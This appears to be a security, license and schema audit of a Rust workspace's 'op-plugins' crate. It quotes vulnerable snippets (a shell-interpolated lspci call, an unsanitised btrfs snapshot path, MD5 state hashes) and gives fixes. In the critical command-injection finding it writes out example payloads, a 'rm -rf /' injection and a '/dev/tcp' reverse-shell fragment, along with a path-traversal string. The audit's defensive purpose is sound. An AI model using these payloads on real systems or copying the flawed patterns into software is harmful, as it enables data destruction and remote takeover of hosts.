# 1. License Audit

### 1.1 Cargo.toml License Field Extraction
*   **Workspace Package License**: Inherited from `[workspace.package]` as `Apache-2.0` in `Cargo.toml` (under the workspace package configuration).
*   **`op-plugins` License**: Inherits `Apache-2.0` via the `license.workspace = true` setting in `crates/op-plugins/Cargo.toml`.

### 1.2 Cargo.lock / Workspace GPL/AGPL/SSPL Crate Scan
*   **AGPL-3.0 Crate Detected**: `cozo = { version = "0.7.6", default-features = false, features = ["rayon", "storage-sled"] }` is declared in the root `Cargo.toml` under `[workspace.dependencies]`.
*   **Incompatibility Risk**: The `cozo` library is famously licensed under the **GNU Affero General Public License v3.0 (AGPL-3.0)**. Since the `op-dbus` workspace is advertised and licensed under `Apache-2.0` (which is a permissive license), incorporating an AGPL-3.0 copyleft dependency introduces severe copyleft contamination risk. Any binary or service in the workspace that links Cozo (such as `op-cognitive-mcp`) must be licensed under AGPL-3.0, requiring the complete source code of the combined work to be made available to users interacting with it over a network. This directly violates the permissive licensing goal of the `Apache-2.0` workspace packages.

### 1.3 Crates with No License Field
*   No crates are missing a license field. All workspace crates specified in the provided files inherit `Apache-2.0` via `license.workspace = true`.

---

# 2. Security Audit

### CRITICAL: Remote Command Injection via Unsanitized Address
*   **Location**: `crates/op-plugins/src/state_plugins/pcidecl.rs:73-82`
*   **Description**: The `lspci_present` helper function executes a shell command using `Command::new("sh").arg("-c")` and directly interpolates the `addr` parameter:
    ```rust
    fn lspci_present(addr: &str) -> bool {
        if let Ok(out) = Command::new("sh")
            .arg("-c")
            .arg(format!("lspci -s {} >/dev/null 2>&1; echo $?", addr))
            .output()
    ```
    The `addr` parameter originates from the `desired` configuration state sent to the `pcidecl` plugin (deserialized as `item.address`).
*   **Impact**: Any local user or remote system capable of writing to or setting the `desired` state for the `pcidecl` plugin can inject arbitrary shell metacharacters (e.g., `; rm -rf /;` or `; bash -i >& /dev/tcp/... 2>&1;`) into the `address` field. This command will execute with root privileges because the host-level control plane daemon typically runs as root.
*   **Remediation**: Eliminate the use of a shell interpreter. Execute `/usr/bin/lspci` directly with arguments as a safe array, or strictly validate that the `addr` string conforms to a valid PCI address pattern (such as `^[0-9a-fA-F]{4}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}\.[0-9a-fA-F]$`) before command execution.

### HIGH: Path Traversal and Arbitrary Directory Snapshot via `golden_image`
*   **Location**: `crates/op-plugins/src/state_plugins/lxc.rs:326-340` (and `376-383` / `408-410`)
*   **Description**: The `create_container_from_btrfs_snapshot` function retrieves `golden_image_name` from the `properties` map of the desired state and formats a BTRFS subvolume path:
    ```rust
    let golden_image_path = format!("{}/templates/subvol/{}", storage_path, golden_image_name);
    ```
    It then executes a BTRFS snapshot command using this path:
    ```rust
    let snapshot_output = tokio::process::Command::new("btrfs")
        .args([
            "subvolume",
            "snapshot",
            &golden_image_path,
            &container_rootfs,
        ])
    ```
*   **Impact**: There is no path validation or sanitization on `golden_image_name`. An attacker controlling the desired state of the `lxc` plugin can supply directory traversal sequences (such as `../../../../some_btrfs_subvolume`), allowing them to copy arbitrary BTRFS subvolumes from the host filesystem into a container root filesystem they own.
*   **Remediation**: Strictly sanitize the `golden_image_name` input to forbid directory separators (`/`, `\`) and traversal tokens (`..`). Alternatively, use `Path::canonicalize` and assert that the target path remains inside `/var/lib/pve/{storage}/templates/subvol/`.

### MEDIUM: Broken Cryptographic Auditing via MD5 State Footprints
*   **Location**: 
    *   `crates/op-plugins/src/auto_create.rs:92-93`
    *   `crates/op-plugins/src/state_plugins/config.rs:173-174`
    *   `crates/op-plugins/src/state_plugins/dnsresolver.rs:207-213`
    *   `crates/op-plugins/src/state_plugins/keyring.rs:182-183`
    *   `crates/op-plugins/src/state_plugins/login1.rs:78-79`
    *   `crates/op-plugins/src/state_plugins/lxc.rs:438-439`
    *   `crates/op-plugins/src/state_plugins/mcp.rs:443-444`
    *   `crates/op-plugins/src/state_plugins/netmaker.rs:269-270`
    *   `crates/op-plugins/src/state_plugins/privacy.rs:101-102`
    *   `crates/op-plugins/src/state_plugins/privacy_routes.rs:135-136`
    *   `crates/op-plugins/src/state_plugins/rtnetlink.rs:191-192`
    *   `crates/op-plugins/src/state_plugins/systemd.rs:388-389`
    *   `crates/op-plugins/src/state_plugins/dinit.rs:212-213`
    *   `crates/op-plugins/src/state_plugins/openflow_obfuscation.rs:440-441`
    *   `crates/op-plugins/src/state_plugins/privacy_router.rs:722-723`
*   **Description**: Throughout the system, `md5::compute` is used to generate state hashes for current and desired configurations. These hashes are populated in `DiffMetadata` to provide "automatic hash footprints for snowball audit trail".
*   **Impact**: MD5 is cryptographically broken and highly vulnerable to collision attacks. An attacker could craft two distinct configurations that generate identical MD5 hashes, allowing them to modify the system state without altering the snowball footprint, effectively rendering the audit trail untrusted.
*   **Remediation**: Replace MD5 with a secure cryptographic hashing algorithm such as SHA-256 (using the `sha2` crate already present in the workspace).

### LOW: Option Injection via Unvalidated Package Name
*   **Location**: `crates/op-plugins/src/state_plugins/packagekit.rs:113` & `135`
*   **Description**: The `install_via_direct` and `remove_via_direct` functions pass `package_name` (sourced from desired state) directly as an argument to package managers like `apt-get`, `dnf`, or `pacman`:
    ```rust
    Command::new("apt-get").args(["install", "-y", package_name])
    ```
*   **Impact**: While shell injection is not possible because `Command` is used directly without spawning a shell, there is no validation on `package_name`. If a user supplies a package name starting with `-` (e.g., `--help`, `--option`), it can be interpreted as a command-line flag by the package manager, causing unexpected behavior or errors.
*   **Remediation**: Validate `package_name` against a strict whitelist regular expression of acceptable package characters (e.g., `^[a-zA-Z0-9._+-]+$`) before spawning process commands.

### LOW: Logic Error in `apt` Command Argument Chaining
*   **Location**: `crates/op-plugins/src/state_plugins/netmaker.rs:206-209`
*   **Description**: The installation command is structured as:
    ```rust
    Command::new("apt")
        .args(["update", "&&", "apt", "install", "-y", "netclient"])
    ```
*   **Impact**: Passing shell logical operators like `&&` inside `Command::args` without executing under a shell interpreter (`sh -c`) will pass `&&` and `apt` as literal arguments to the `apt` binary. This command will consistently fail to execute as intended.
*   **Remediation**: Use two separate `Command` invocations (one for `update` and one for `install`), or execute through a shell if logical chaining is required.

---

# 3. Schema-as-Code Discipline Audit

The codebase regularly relies on ad-hoc structs and unstructured JSON strings to define domain data contracts rather than versioned schemas. Below is the list of violations:

### 3.1 Ad-hoc Chat Data Contracts
*   **Location**: `crates/op-plugins/src/chat.rs:10-74`
*   **Description**: Ad-hoc structures (`ChatMessage`, `ToolCall`, `ChatRequest`, `ChatResponse`, `TokenUsage`) are defined as traditional Rust structs with Serde attributes instead of generating them from versioned Protocol Buffers or shared JSON schemas.

### 3.2 Discovery Data Serialization
*   **Location**: `crates/op-plugins/src/auto_create.rs:25-30`
*   **Description**: Discovered systemd services are packed into an ad-hoc JSON structure (`json!({ ... })`) rather than using a versioned schema model.

### 3.3 Domain Specific Ad-hoc State Definitions
*   **Location**: `crates/op-plugins/src/state_plugins/dnsresolver.rs:11-30`
*   **Description**: Ad-hoc structs `DnsState`, `Mode`, and `DnsItem` are used to represent dnsresolver contracts.

*   **Location**: `crates/op-plugins/src/state_plugins/gcloud_adc.rs:9-13`
*   **Description**: Ad-hoc struct `GcloudAdcState` for Google Cloud ADC state.

*   **Location**: `crates/op-plugins/src/state_plugins/hardware.rs:9-31`
*   **Description**: Ad-hoc structs `HardwareState`, `CpuInfo`, `MemoryInfo`, and `DiskInfo` for hardware state.

*   **Location**: `crates/op-plugins/src/state_plugins/incus.rs:17-41`
*   **Description**: Ad-hoc structs `IncusState` and `IncusInstance` for Incus state.

*   **Location**: `crates/op-plugins/src/state_plugins/keypair.rs:9-20`
*   **Description**: Ad-hoc structs `KeypairState` and `Keypair` for keypair states.

*   **Location**: `crates/op-plugins/src/state_plugins/keyring.rs:20-36`
*   **Description**: Ad-hoc structs `KeyringState` and `CollectionInfo` for keyring states.

*   **Location**: `crates/op-plugins/src/state_plugins/login1.rs:11-23`
*   **Description**: Ad-hoc structs `Login1State` and `SessionInfo` for session login information.

*   **Location**: `crates/op-plugins/src/state_plugins/lxc.rs:23-35`
*   **Description**: Ad-hoc structs `LxcState` and `ContainerInfo` for LXC container states.

*   **Location**: `crates/op-plugins/src/state_plugins/proxmox.rs:8-17`
*   **Description**: Ad-hoc structs `ProxmoxState` and `ContainerState` for Proxmox container states.

*   **Location**: `crates/op-plugins/src/state_plugins/proxy_server.rs:8-12`
*   **Description**: Ad-hoc struct `ProxyServerState` for proxy server runtime config.

*   **Location**: `crates/op-plugins/src/state_plugins/software.rs:9-19`
*   **Description**: Ad-hoc structs `SoftwareState` and `PackageInfo` for software package state.

*   **Location**: `crates/op-plugins/src/state_plugins/users.rs:8-23`
*   **Description**: Ad-hoc structs `UsersState` and `UserConfig` for user account state.

*   **Location**: `crates/op-plugins/src/state_plugins/wireguard.rs:8-25`
*   **Description**: Ad-hoc structs `WireGuardState`, `WireGuardInterface`, and `WireGuardPeer` for WireGuard interface state.

*   **Location**: `crates/op-plugins/src/state_plugins/unix_socket.rs:10-23`
*   **Description**: Ad-hoc structs `UnixSocketState` and `SocketEndpoint` for socket state.

*   **Location**: `crates/op-plugins/src/state_plugins/full_system.rs:24-118`
*   **Description**: Ad-hoc structs representing full system state categories (`FullSystemState`, `SystemInfo`, `NetworkState`, `InterfaceInfo`, `RouteInfo`, `BridgeInfo`, `ServiceState`, `PackageInfo`, `UserInfo`, `StorageState`, `MountInfo`, `BlockDeviceInfo`, `ContainerState`, `LxcContainerInfo`, `DockerContainerInfo`) are used to model the comprehensive state snapshot rather than versioned schema catalogs.